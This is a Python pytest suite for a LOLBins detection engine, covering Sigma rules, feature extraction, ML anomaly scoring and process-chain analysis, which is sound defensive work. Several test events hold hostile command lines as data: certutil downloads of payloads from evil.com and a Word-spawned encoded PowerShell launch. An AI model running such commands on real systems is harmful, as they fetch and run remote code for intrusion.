#!/usr/bin/env python3
"""
Test Suite for LOLBins Detection Engine
========================================
Validates data generation, feature engineering, Sigma matching,
ML scoring, chain analysis, and end-to-end pipeline.

Run with: python -m pytest tests/ -v

Author: Eswar Achari
"""

import os
import sys
import math
import json
import tempfile
import shutil

import pytest
import pandas as pd
import numpy as np

# Add project root to path
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, PROJECT_ROOT)

from src.generate_synthetic_data import (
    gen_benign_events, gen_malicious_events, gen_gray_area_events,
    random_guid, random_base64_payload,
)
from src.feature_engineering import FeatureEngineer
from src.sigma_engine import SigmaEngine
from src.ml_anomaly_scorer import MLAnomalyScorer
from src.chain_analyzer import ChainAnalyzer


# ─────────── Fixtures ───────────

@pytest.fixture(scope="module")
def sample_benign_events():
    """Generate a small set of benign events for testing."""
    return gen_benign_events(50)


@pytest.fixture(scope="module")
def sample_malicious_events():
    """Generate a small set of malicious events for testing."""
    return gen_malicious_events(20)


@pytest.fixture(scope="module")
def sample_gray_events():
    """Generate a small set of gray-area events."""
    return gen_gray_area_events(10)


@pytest.fixture(scope="module")
def sample_dataframe(sample_benign_events, sample_malicious_events, sample_gray_events):
    """Create a combined DataFrame for testing."""
    all_events = sample_benign_events + sample_malicious_events + sample_gray_events
    return pd.DataFrame(all_events)


@pytest.fixture(scope="module")
def temp_data_dir(sample_dataframe, sample_benign_events):
    """Create temporary data directory with test files."""
    tmpdir = tempfile.mkdtemp(prefix="lolbins_test_")
    data_dir = os.path.join(tmpdir, "data")
    os.makedirs(data_dir, exist_ok=True)

    # Save test datasets
    sample_dataframe.to_csv(os.path.join(data_dir, "full_dataset.csv"), index=False)
    pd.DataFrame(sample_benign_events).to_csv(
        os.path.join(data_dir, "benign_baseline.csv"), index=False)

    yield tmpdir

    # Cleanup
    shutil.rmtree(tmpdir, ignore_errors=True)


# ─────────── Data Generation Tests ───────────

class TestDataGeneration:
    """Test synthetic data generation quality and schema."""

    def test_benign_count(self, sample_benign_events):
        """Verify correct number of benign events."""
        assert len(sample_benign_events) == 50

    def test_malicious_count(self, sample_malicious_events):
        """Verify correct number of malicious events."""
        assert len(sample_malicious_events) == 20

    def test_event_schema(self, sample_benign_events):
        """Verify all required fields are present."""
        required_fields = [
            'UtcTime', 'ProcessGuid', 'ProcessId', 'Image',
            'CommandLine', 'ParentImage', 'ParentCommandLine',
            'ParentProcessId', 'User', 'IntegrityLevel',
            'is_malicious', 'mitre_technique_id', 'technique_name', 'label',
        ]
        event = sample_benign_events[0]
        for field in required_fields:
            assert field in event, f"Missing field: {field}"

    def test_benign_labels(self, sample_benign_events):
        """Verify benign events have correct labels."""
        for event in sample_benign_events:
            assert event['is_malicious'] == 0
            assert event['label'] == 'benign'

    def test_malicious_labels(self, sample_malicious_events):
        """Verify malicious events have correct labels."""
        for event in sample_malicious_events:
            assert event['is_malicious'] == 1
            assert event['label'] == 'malicious'
            assert event['mitre_technique_id'] != ''

    def test_guid_format(self, sample_benign_events):
        """Verify ProcessGuid format."""
        guid = sample_benign_events[0]['ProcessGuid']
        assert guid.startswith('{')
        assert guid.endswith('}')
        assert len(guid) == 38  # {UUID} format

    def test_timestamp_format(self, sample_benign_events):
        """Verify timestamp can be parsed."""
        ts = sample_benign_events[0]['UtcTime']
        parsed = pd.to_datetime(ts)
        assert parsed is not None

    def test_malicious_techniques_diversity(self, sample_malicious_events):
        """Verify multiple techniques are represented."""
        techniques = set(e['mitre_technique_id'] for e in sample_malicious_events)
        assert len(techniques) >= 3, f"Only {len(techniques)} techniques found"

    def test_image_paths(self, sample_benign_events):
        """Verify Image paths look like Windows paths."""
        for event in sample_benign_events[:10]:
            assert '\\' in event['Image'] or '/' in event['Image']

    def test_base64_generation(self):
        """Test base64 payload generation."""
        b64 = random_base64_payload(60)
        assert len(b64) > 10
        assert all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
                   for c in b64)


# ─────────── Feature Engineering Tests ───────────

class TestFeatureEngineering:
    """Test feature extraction and computation."""

    def test_shannon_entropy_empty(self):
        """Entropy of empty string should be 0."""
        fe = FeatureEngineer()
        assert fe.shannon_entropy('') == 0.0

    def test_shannon_entropy_uniform(self):
        """Entropy of single repeated character should be 0."""
        fe = FeatureEngineer()
        assert fe.shannon_entropy('aaaa') == 0.0

    def test_shannon_entropy_diverse(self):
        """Entropy of diverse string should be higher."""
        fe = FeatureEngineer()
        entropy = fe.shannon_entropy('abcdefghijklmnop')
        assert entropy > 3.0  # 16 unique chars = 4.0 bits

    def test_shannon_entropy_binary(self):
        """Entropy of two-character string should be 1.0."""
        fe = FeatureEngineer()
        entropy = fe.shannon_entropy('ab')
        assert abs(entropy - 1.0) < 0.01

    def test_feature_extraction(self, sample_dataframe):
        """Test that feature extraction produces expected columns."""
        fe = FeatureEngineer()
        result = fe.extract_features(sample_dataframe)

        expected_features = [
            'is_known_lolbin', 'is_scripting_engine',
            'command_line_length', 'command_line_entropy',
            'has_suspicious_flag', 'contains_url',
            'hour_of_day', 'is_off_hours',
        ]
        for col in expected_features:
            assert col in result.columns, f"Missing feature: {col}"

    def test_feature_types(self, sample_dataframe):
        """Verify feature types are numeric."""
        fe = FeatureEngineer()
        result = fe.extract_features(sample_dataframe)

        for col in fe.get_feature_columns():
            if col in result.columns:
                assert pd.api.types.is_numeric_dtype(result[col]), \
                    f"Feature {col} is not numeric"

    def test_lolbin_detection(self):
        """Test LOLBin binary detection."""
        fe = FeatureEngineer()
        event = pd.DataFrame([{
            'Image': 'C:\\Windows\\System32\\certutil.exe',
            'CommandLine': 'certutil.exe -urlcache -f http://evil.com/p.exe out.exe',
            'ParentImage': 'C:\\Windows\\System32\\cmd.exe',
            'ParentCommandLine': 'cmd.exe',
            'User': 'CORP\\user1',
            'IntegrityLevel': 'Medium',
            'UtcTime': '2024-07-01T10:00:00.000Z',
        }])
        result = fe.extract_features(event)
        assert result['is_known_lolbin'].iloc[0] == 1
        assert result['contains_url'].iloc[0] == 1
        assert result['has_suspicious_flag'].iloc[0] == 1

    def test_feature_column_count(self):
        """Verify we have 24 ML feature columns."""
        fe = FeatureEngineer()
        cols = fe.get_feature_columns()
        assert len(cols) == 24


# ─────────── Sigma Engine Tests ───────────

class TestSigmaEngine:
    """Test Sigma rule loading and matching."""

    def test_rule_loading(self):
        """Verify rules are loaded successfully."""
        rules_dir = os.path.join(PROJECT_ROOT, 'rules', 'sigma_rules')
        if os.path.exists(rules_dir):
            engine = SigmaEngine(rules_dir)
            assert len(engine.rules) >= 1

    def test_certutil_detection(self):
        """Test certutil download rule matching."""
        rules_dir = os.path.join(PROJECT_ROOT, 'rules', 'sigma_rules')
        if not os.path.exists(rules_dir):
            pytest.skip("Rules directory not found")

        engine = SigmaEngine(rules_dir)
        event = {
            'Image': 'C:\\Windows\\System32\\certutil.exe',
            'CommandLine': 'certutil.exe -urlcache -f http://evil.com/payload.exe out.exe',
            'ParentImage': 'C:\\Windows\\System32\\cmd.exe',
        }
        matches = engine.evaluate_event(event)
        assert len(matches) > 0, "Certutil download should trigger a rule"

    def test_benign_no_match(self):
        """Test that benign events don't trigger rules."""
        rules_dir = os.path.join(PROJECT_ROOT, 'rules', 'sigma_rules')
        if not os.path.exists(rules_dir):
            pytest.skip("Rules directory not found")

        engine = SigmaEngine(rules_dir)
        event = {
            'Image': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'CommandLine': 'chrome.exe --no-first-run',
            'ParentImage': 'C:\\Windows\\explorer.exe',
        }
        matches = engine.evaluate_event(event)
        assert len(matches) == 0, "Chrome launch should not trigger any rule"

    def test_dataset_evaluation(self, sample_dataframe):
        """Test bulk dataset evaluation."""
        rules_dir = os.path.join(PROJECT_ROOT, 'rules', 'sigma_rules')
        if not os.path.exists(rules_dir):
            pytest.skip("Rules directory not found")

        engine = SigmaEngine(rules_dir)
        result = engine.evaluate_dataset(sample_dataframe)
        assert 'sigma_match' in result.columns
        assert 'sigma_rule_name' in result.columns


# ─────────── ML Scorer Tests ───────────

class TestMLScorer:
    """Test ML anomaly scoring."""

    def test_scorer_initialization(self):
        """Test scorer can be initialized."""
        scorer = MLAnomalyScorer()
        assert not scorer.is_trained
        assert len(scorer.FEATURE_COLUMNS) == 24

    def test_training(self, sample_dataframe):
        """Test model training on benign data."""
        fe = FeatureEngineer()
        features = fe.extract_features(sample_dataframe)
        benign = features[features['label'] == 'benign']

        scorer = MLAnomalyScorer()
        scorer.train(benign)
        assert scorer.is_trained
        assert len(scorer.models) == 3

    def test_scoring_range(self, sample_dataframe):
        """Test that scores are in 0-100 range."""
        fe = FeatureEngineer()
        features = fe.extract_features(sample_dataframe)
        benign = features[features['label'] == 'benign']

        scorer = MLAnomalyScorer()
        scorer.train(benign)
        scores = scorer.score(features)

        assert np.all(scores >= 0), "Scores should be >= 0"
        assert np.all(scores <= 100), "Scores should be <= 100"

    def test_malicious_score_higher(self, sample_dataframe):
        """Test that malicious events generally score higher."""
        fe = FeatureEngineer()
        features = fe.extract_features(sample_dataframe)
        benign = features[features['label'] == 'benign']

        scorer = MLAnomalyScorer()
        scorer.train(benign)
        scores = scorer.score(features)
        features['score'] = scores

        benign_mean = features[features['label'] == 'benign']['score'].mean()
        mal_mean = features[features['label'] == 'malicious']['score'].mean()

        # Malicious should generally score higher (not guaranteed for every event)
        assert mal_mean > benign_mean, \
            f"Malicious mean ({mal_mean:.1f}) should exceed benign ({benign_mean:.1f})"

    def test_explain_output(self, sample_dataframe):
        """Test explanation generation."""
        fe = FeatureEngineer()
        features = fe.extract_features(sample_dataframe)
        benign = features[features['label'] == 'benign']

        scorer = MLAnomalyScorer()
        scorer.train(benign)

        mal_event = features[features['label'] == 'malicious'].iloc[0]
        explanation = scorer.explain(mal_event, score=85.0)
        assert isinstance(explanation, str)
        assert 'ANOMALY SCORE' in explanation


# ─────────── Chain Analyzer Tests ───────────

class TestChainAnalyzer:
    """Test behavioral chain analysis."""

    def test_malicious_chain_detection(self):
        """Test known malicious chain is detected."""
        analyzer = ChainAnalyzer()
        event = {
            'Image': 'C:\\Windows\\System32\\cmd.exe',
            'CommandLine': 'cmd.exe /c powershell.exe -enc AAAA',
            'ParentImage': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
            'UtcTime': '2024-07-01T03:00:00.000Z',
        }
        result = analyzer.analyze_event(event)
        assert result['chain_risk_score'] > 50
        assert result['chain_matched_pattern'] is True

    def test_benign_chain(self):
        """Test benign chain gets low score."""
        analyzer = ChainAnalyzer()
        event = {
            'Image': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'CommandLine': 'chrome.exe --no-first-run',
            'ParentImage': 'C:\\Windows\\explorer.exe',
            'UtcTime': '2024-07-01T10:00:00.000Z',
        }
        result = analyzer.analyze_event(event)
        assert result['chain_risk_score'] < 50

    def test_dataset_analysis(self, sample_dataframe):
        """Test bulk dataset chain analysis."""
        analyzer = ChainAnalyzer()
        result = analyzer.analyze_dataset(sample_dataframe)
        assert 'chain_risk_score' in result.columns
        assert 'chain_description' in result.columns
        assert result['chain_risk_score'].min() >= 0
        assert result['chain_risk_score'].max() <= 100


# ─────────── Helper for data gen import ───────────
# Add this function to generate_synthetic_data.py's namespace for testing
def shannon_entropy_check(text):
    """Importable entropy check for tests."""
    from src.feature_engineering import FeatureEngineer
    return FeatureEngineer.shannon_entropy(text)


if __name__ == "__main__":
    pytest.main([__file__, '-v', '--tb=short'])
